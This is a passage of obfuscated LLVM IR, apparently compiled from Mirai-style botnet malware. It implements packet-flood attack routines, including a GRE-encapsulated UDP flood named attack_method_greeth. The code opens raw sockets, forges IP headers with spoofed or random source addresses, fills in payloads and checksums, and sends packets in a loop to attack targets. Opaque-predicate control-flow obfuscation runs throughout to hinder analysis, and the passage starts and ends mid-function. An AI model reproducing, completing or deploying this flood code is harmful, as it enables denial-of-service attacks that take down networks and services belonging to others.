  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %398, label %407, label %413

; <label>:407:                                    ; preds = %originalBBpart216
  %408 = call i32 @rand_next()
  %409 = and i32 %408, 65535
  %410 = trunc i32 %409 to i16
  %411 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 0
  store i16 %410, i16* %412, align 2
  br label %413

; <label>:413:                                    ; preds = %407, %originalBBpart216
  %414 = load i16, i16* %17, align 2
  %415 = zext i16 %414 to i32
  %416 = icmp eq i32 %415, 65535
  br i1 %416, label %417, label %423

; <label>:417:                                    ; preds = %413
  %418 = call i32 @rand_next()
  %419 = and i32 %418, 65535
  %420 = trunc i32 %419 to i16
  %421 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 1
  store i16 %420, i16* %422, align 2
  br label %423

; <label>:423:                                    ; preds = %417, %413
  %424 = load i32, i32* @x.19
  %425 = load i32, i32* @y.20
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %423
  %432 = load i8, i8* %20, align 1
  %433 = icmp ne i8 %432, 0
  %434 = load i32, i32* @x.19
  %435 = load i32, i32* @y.20
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %433, label %446, label %442

; <label>:442:                                    ; preds = %originalBBpart220
  %443 = call i32 @rand_next()
  %444 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i32 0, i32 9
  store i32 %443, i32* %445, align 4
  br label %452

; <label>:446:                                    ; preds = %originalBBpart220
  %447 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 9
  %449 = load i32, i32* %448, align 4
  %450 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 9
  store i32 %449, i32* %451, align 4
  br label %452

; <label>:452:                                    ; preds = %446, %442
  %453 = load i32, i32* @x.19
  %454 = load i32, i32* @y.20
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %452
  %461 = load i8, i8* %19, align 1
  %462 = icmp ne i8 %461, 0
  %463 = load i32, i32* @x.19
  %464 = load i32, i32* @y.20
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %462, label %471, label %490

; <label>:471:                                    ; preds = %originalBBpart224
  %472 = load i32, i32* @x.19
  %473 = load i32, i32* @y.20
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %471
  %480 = load i8*, i8** %31, align 8
  %481 = load i32, i32* %18, align 4
  call void @rand_str(i8* %480, i32 %481)
  %482 = load i32, i32* @x.19
  %483 = load i32, i32* @y.20
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %490

; <label>:490:                                    ; preds = %originalBBpart228, %originalBBpart224
  %491 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 7
  store i16 0, i16* %492, align 2
  %493 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %494 = bitcast %struct.iphdr* %493 to i16*
  %495 = call zeroext i16 @checksum_generic(i16* %494, i32 20)
  %496 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 7
  store i16 %495, i16* %497, align 2
  %498 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 7
  store i16 0, i16* %499, align 2
  %500 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %501 = bitcast %struct.iphdr* %500 to i16*
  %502 = call zeroext i16 @checksum_generic(i16* %501, i32 20)
  %503 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 7
  store i16 %502, i16* %504, align 2
  %505 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %506 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %505, i32 0, i32 3
  store i16 0, i16* %506, align 2
  %507 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %508 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %509 = bitcast %struct.udphdr* %508 to i8*
  %510 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %511 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %510, i32 0, i32 2
  %512 = load i16, i16* %511, align 2
  %513 = load i32, i32* %18, align 4
  %514 = sext i32 %513 to i64
  %515 = add i64 8, %514
  %516 = trunc i64 %515 to i32
  %517 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %507, i8* %509, i16 zeroext %512, i32 %516)
  %518 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 2
  %520 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 0
  %525 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %524, i32 0, i32 0
  store i16 2, i16* %525, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 9
  %528 = load i32, i32* %527, align 4
  %529 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %530 = load i32, i32* %9, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 0
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %533, i32 0, i32 2
  %535 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %534, i32 0, i32 0
  store i32 %528, i32* %535, align 4
  %536 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i32 0, i32 0
  %541 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %540, i32 0, i32 1
  store i16 0, i16* %541, align 2
  %542 = load i32, i32* %10, align 4
  %543 = load i8*, i8** %26, align 8
  %544 = load i32, i32* %18, align 4
  %545 = sext i32 %544 to i64
  %546 = add i64 52, %545
  %547 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %548 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %549 = load i32, i32* %9, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i64 %550
  %552 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %551, i32 0, i32 0
  %553 = bitcast %struct.sockaddr_in* %552 to %struct.sockaddr*
  store %struct.sockaddr* %553, %struct.sockaddr** %547, align 8
  %554 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %555 = load %struct.sockaddr*, %struct.sockaddr** %554, align 8
  %556 = call i64 @sendto(i32 %542, i8* %543, i64 %546, i32 16384, %struct.sockaddr* %555, i32 16)
  br label %557

; <label>:557:                                    ; preds = %490
  %558 = load i32, i32* %9, align 4
  %559 = add nsw i32 %558, 1
  store i32 %559, i32* %9, align 4
  br label %275

; <label>:560:                                    ; preds = %originalBBpart28
  br label %274

; <label>:561:                                    ; preds = %100, %78
  %562 = load i32, i32* @x.19
  %563 = load i32, i32* @y.20
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %561
  %570 = load i32, i32* @x.19
  %571 = load i32, i32* @y.20
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %79
  store i32 1, i32* %9, align 4
  %578 = load i32, i32* %10, align 4
  %579 = bitcast i32* %9 to i8*
  %580 = call i32 @setsockopt(i32 %578, i32 0, i32 3, i8* %579, i32 4) #6
  %581 = icmp eq i32 %580, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %212
  %582 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %583 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %584 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %583, i32 0, i32 4
  store i16 %582, i16* %584, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %275
  %585 = load i32, i32* %9, align 4
  %586 = load i8, i8* %5, align 1
  %587 = zext i8 %586 to i32
  %588 = icmp slt i32 %585, %587
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %348
  %589 = call i32 @rand_next()
  %590 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 8
  store i32 %589, i32* %591, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %387
  %592 = load i16, i16* %16, align 2
  %593 = zext i16 %592 to i32
  %594 = icmp eq i32 %593, 65535
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %423
  %595 = load i8, i8* %20, align 1
  %596 = icmp ne i8 %595, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %452
  %597 = load i8, i8* %19, align 1
  %598 = icmp ne i8 %597, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %471
  %599 = load i8*, i8** %31, align 8
  %600 = load i32, i32* %18, align 4
  call void @rand_str(i8* %599, i32 %600)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %561
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %632

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %111

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* @x.21
  %94 = load i32, i32* @y.22
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %92
  %101 = load i32, i32* %10, align 4
  %102 = call i32 @close(i32 %101)
  %103 = load i32, i32* @x.21
  %104 = load i32, i32* @y.22
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %632

; <label>:111:                                    ; preds = %87
  store i32 0, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %originalBBpart242, %111
  %113 = load i32, i32* @x.21
  %114 = load i32, i32* @y.22
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %112
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = load i32, i32* @x.21
  %126 = load i32, i32* @y.22
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %124, label %133, label %335

; <label>:133:                                    ; preds = %originalBBpart24
  %134 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %22, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.grehdr*
  store %struct.grehdr* %147, %struct.grehdr** %23, align 8
  %148 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %149 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %148, i64 1
  %150 = bitcast %struct.grehdr* %149 to %struct.ethhdr*
  store %struct.ethhdr* %150, %struct.ethhdr** %24, align 8
  %151 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %152 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %151, i64 1
  %153 = bitcast %struct.ethhdr* %152 to %struct.iphdr*
  store %struct.iphdr* %153, %struct.iphdr** %25, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i64 1
  %156 = bitcast %struct.iphdr* %155 to %struct.udphdr*
  store %struct.udphdr* %156, %struct.udphdr** %26, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %18, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 66, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %206

; <label>:186:                                    ; preds = %133
  %187 = load i32, i32* @x.21
  %188 = load i32, i32* @y.22
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %186
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* @x.21
  %199 = load i32, i32* @y.22
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %206

; <label>:206:                                    ; preds = %originalBBpart28, %133
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 47, i8* %208, align 1
  %209 = load i32, i32* %21, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %221 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %222 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %221, i32 0, i32 1
  store i16 %220, i16* %222, align 2
  %223 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %224 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %225 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %224, i32 0, i32 2
  store i16 %223, i16* %225, align 1
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = bitcast %struct.iphdr* %226 to i8*
  %228 = load i8, i8* %227, align 4
  %229 = and i8 %228, 15
  %230 = or i8 %229, 64
  store i8 %230, i8* %227, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = bitcast %struct.iphdr* %231 to i8*
  %233 = load i8, i8* %232, align 4
  %234 = and i8 %233, -16
  %235 = or i8 %234, 5
  store i8 %235, i8* %232, align 4
  %236 = load i8, i8* %12, align 1
  %237 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 1
  store i8 %236, i8* %238, align 1
  %239 = load i32, i32* %18, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 28, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  %246 = load i16, i16* %13, align 2
  %247 = zext i16 %246 to i32
  %248 = xor i32 %247, -1
  %249 = trunc i32 %248 to i16
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  %253 = load i8, i8* %14, align 1
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 5
  store i8 %253, i8* %255, align 4
  %256 = load i8, i8* %15, align 1
  %257 = icmp ne i8 %256, 0
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %206
  %259 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 4
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %258, %206
  %263 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 6
  store i8 17, i8* %264, align 1
  %265 = call i32 @rand_next()
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 8
  store i32 %265, i32* %267, align 4
  %268 = load i8, i8* %20, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %276

; <label>:270:                                    ; preds = %262
  %271 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 9
  %273 = load i32, i32* %272, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  br label %300

; <label>:276:                                    ; preds = %262
  %277 = load i32, i32* @x.21
  %278 = load i32, i32* @y.22
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %276
  %285 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  %287 = load i32, i32* %286, align 4
  %288 = sub i32 %287, 1024
  %289 = xor i32 %288, -1
  %290 = load %struct.iphdr*, %struct.iphdr** %25, align 8
